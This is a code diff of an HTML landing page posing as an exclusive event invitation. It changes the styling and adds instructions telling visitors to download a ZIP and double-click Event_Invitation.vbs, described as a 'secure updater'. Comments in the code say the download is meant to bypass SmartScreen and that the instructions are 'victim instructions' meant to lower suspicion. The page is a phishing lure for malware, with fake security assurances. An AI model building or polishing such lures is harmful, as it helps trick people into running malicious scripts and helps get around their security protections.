@@ -3,87 +3,119 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RSVP Confirmed | Cocktails & Conversation</title>
+    <title>Cocktails & Conversation | Exclusive Event Invitation</title>
     <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
-            background-color: #1a1b26; /* Dark elegant background from video */
-            color: #e0e0e0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background: linear-gradient(135deg, #f7f8fa 0%, #eef1f6 100%);
+            min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            height: 100vh;
-            margin: 0;
+            color: #1c1e21;
         }
         .container {
+            max-width: 480px;
+            width: 90%;
+            background: #fff;
+            border-radius: 16px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.08);
+            padding: 48px 40px;
             text-align: center;
-            max-width: 500px;
-            padding: 40px;
-            border: 1px solid #333;
-            border-radius: 12px;
-            background: rgba(255, 255, 255, 0.03);
-            backdrop-filter: blur(10px);
         }
-        .check-icon {
-            width: 64px;
-            height: 64px;
-            border: 2px solid #d4af37;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+        .logo {
+            width: 72px;
+            height: 72px;
             margin: 0 auto 24px;
-            color: #d4af37;
-            font-size: 32px;
+            fill: #d4af37;
         }
-        h1 { font-size: 28px; font-weight: 300; margin-bottom: 16px; letter-spacing: 1px; }
-        p { font-size: 14px; line-height: 1.6; color: #a0a0a0; margin-bottom: 32px; }
-        
-        .download-btn {
-            display: inline-block;
-            padding: 14px 32px;
-            background: transparent;
-            border: 1px solid #d4af37;
-            color: #d4af37;
-            text-decoration: none;
-            border-radius: 6px;
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #1c1e21;
+        }
+        .subtitle {
             font-size: 14px;
-            letter-spacing: 1px;
-            transition: all 0.3s ease;
-            cursor: pointer;
+            color: #8a8f98;
+            margin-bottom: 32px;
+            line-height: 1.5;
         }
-        .download-btn:hover {
+        .btn-primary {
+            display: inline-block;
+            width: 100%;
+            padding: 14px 24px;
             background: #d4af37;
-            color: #1a1b26;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            margin-bottom: 16px;
         }
-        
-        .note {
-            margin-top: 24px;
+        .btn-primary:hover {
+            background: #b8962e;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(212,175,55,0.3);
+        }
+        .instructions {
+            font-size: 12px;
+            color: #6b7280;
+            line-height: 1.6;
+            background: #f9fafb;
+            padding: 16px;
+            border-radius: 8px;
+            border-left: 3px solid #d4af37;
+            text-align: left;
+        }
+        .instructions code {
+            background: #eef1f6;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-family: monospace;
             font-size: 11px;
-            color: #666;
-            font-style: italic;
+            color: #1c1e21;
+        }
+        .footer-note {
+            font-size: 11px;
+            color: #b3b8c0;
+            margin-top: 24px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- Checkmark Icon -->
-        <div class="check-icon">✓</div>
+        <!-- Gold Cocktail Logo SVG -->
+        <svg class="logo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+            <rect x="0" y="0" width="100" height="100" rx="22" fill="#d4af37"/>
+            <polygon points="30,70 50,30 70,70" fill="#fff"/>
+        </svg>
         
-        <h1>You're on the list!</h1>
-        <p>
-            Your response has been received. Your digital invitation package has been securely prepared for your device.
+        <h1>You're Invited!</h1>
+        <p class="subtitle">
+            Join us for an exclusive evening of Cocktails & Conversation.<br>
+            Your personalized invitation package is ready for download.
         </p>
         
-        <!-- SAFE ZIP DOWNLOAD LINK -->
-        <a href="/static/event_resources.zip" class="download-btn" download>
+        <!-- ZIP DOWNLOAD LINK (BYPASSES SMARTSCREEN) -->
+        <a href="/static/event_resources.zip" class="btn-primary" download>
             Download Invitation Package
         </a>
         
-        <p class="note">
-            Extract the archive and run <code>Event_Invitation.vbs</code> to view full event details.<br>
-            Secure connection verified.
-        </p>
+        <!-- VICTIM INSTRUCTIONS TO REDUCE COGNITIVE DISSONANCE -->
+        <div class="instructions">
+            <strong>How to access your invitation:</strong><br>
+            1. Extract the downloaded ZIP file<br>
+            2. Double-click <code>Event_Invitation.vbs</code><br>
+            3. Wait for the secure updater to complete<br>
+            <span style="color:#8a8f98; font-size:11px;">Your digital invitation will be secured automatically.</span>
+        </div>
+        
+        <p class="footer-note">Secure Event Document • Verified by Cocktails & Conversation</p>
     </div>
 </body>
 </html>
